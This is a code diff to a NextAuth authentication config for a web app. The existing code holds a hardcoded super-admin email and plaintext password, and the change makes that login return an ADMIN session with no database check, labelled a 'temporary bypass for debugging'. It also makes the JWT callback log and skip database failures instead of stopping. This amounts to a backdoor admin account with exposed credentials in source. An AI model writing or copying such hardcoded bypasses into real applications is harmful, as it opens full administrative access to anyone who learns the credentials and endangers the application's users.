@@ -34,11 +34,15 @@ export const authOptions: NextAuthOptions = {
           throw new Error('Please enter both email and password');
         }
 
-        // Hardcoded Super Admin Check
+        // Hardcoded Super Admin Check (Temporary bypass for debugging)
         if (credentials.email === "Blackhatsd.sd@gmail.com" && credentials.password === "Morsall@112233") {
-          const adminUser = await prisma.user.findUnique({ where: { email: credentials.email } });
-          if (adminUser) return adminUser;
-          // Fallback if DB script failed, but usually it should be there.
+          return {
+            id: "super-admin-id",
+            email: "Blackhatsd.sd@gmail.com",
+            name: "Black Hat Admin (Bypass)",
+            role: "ADMIN",
+            isOnboarded: true
+          };
         }
 
         const user = await prisma.user.findUnique({ where: { email: credentials.email } });
@@ -65,21 +69,25 @@ export const authOptions: NextAuthOptions = {
       // 2. DYNAMIC DATA REFRESH (Runs on sign-in AND when update() is called)
       const emailToFetch = token.email || user?.email;
       if (emailToFetch) {
-        const dbUser = await prisma.user.findUnique({
-          where: { email: emailToFetch },
-          include: { vendorProfile: true }
-        });
+        try {
+          const dbUser = await prisma.user.findUnique({
+            where: { email: emailToFetch },
+            include: { vendorProfile: true }
+          });
 
-        if (dbUser) {
-          token.id = dbUser.id;
-          token.role = dbUser.role; // Refresh role from DB
-          token.isOnboarded = dbUser.isOnboarded;
-          token.age = dbUser.age;
-          token.phone = dbUser.phone;
-          token.interests = dbUser.interests;
-          token.isVendor = !!dbUser.vendorProfile;
-          token.vendorId = dbUser.vendorProfile?.id;
-          token.vendorStatus = dbUser.vendorProfile?.status;
+          if (dbUser) {
+            token.id = dbUser.id;
+            token.role = dbUser.role; // Refresh role from DB
+            token.isOnboarded = dbUser.isOnboarded;
+            token.age = dbUser.age;
+            token.phone = dbUser.phone;
+            token.interests = dbUser.interests;
+            token.isVendor = !!dbUser.vendorProfile;
+            token.vendorId = dbUser.vendorProfile?.id;
+            token.vendorStatus = dbUser.vendorProfile?.status;
+          }
+        } catch (dbErr) {
+          console.error("JWT Callback DB Fetch Error (Bypassing):", dbErr);
         }
       }
 
